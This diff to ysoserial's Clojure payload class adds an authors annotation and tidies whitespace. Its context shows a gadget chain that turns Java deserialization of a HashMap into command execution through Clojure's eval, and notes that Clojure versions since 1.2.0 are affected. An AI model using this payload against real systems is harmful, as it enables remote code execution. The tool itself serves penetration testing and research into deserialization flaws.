@@ -2,6 +2,7 @@ package ysoserial.payloads;
 
 import clojure.inspector.proxy$javax.swing.table.AbstractTableModel$ff19274a;
 import clojure.lang.PersistentArrayMap;
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
 
@@ -9,21 +10,22 @@ import java.util.HashMap;
 import java.util.Map;
 
 /*
-	Gadget chain:	
+	Gadget chain:
 		ObjectInputStream.readObject()
 			HashMap.readObject()
 				AbstractTableModel$ff19274a.hashCode()
 					clojure.core$comp$fn__4727.invoke()
 						clojure.core$constantly$fn__4614.invoke()
 						clojure.main$eval_opt.invoke()
-	
+
 	Requires:
 		org.clojure:clojure
 		Versions since 1.2.0 are vulnerable, although some class names may need to be changed for other versions
  */
 @Dependencies({"org.clojure:clojure:1.8.0"})
+@Authors({ Authors.JACKOFMOSTTRADES })
 public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
-	
+
 	public Map<?, ?> getObject(final String command) throws Exception {
 
 		final String[] execArgs = command.split(" ");
@@ -54,9 +56,9 @@ public class Clojure extends PayloadRunner implements ObjectPayload<Map<?, ?>> {
 
 		return targetMap;
 	}
-	
+
 	public static void main(final String[] args) throws Exception {
 		PayloadRunner.run(Clojure.class, args);
 	}
-	
+
 }
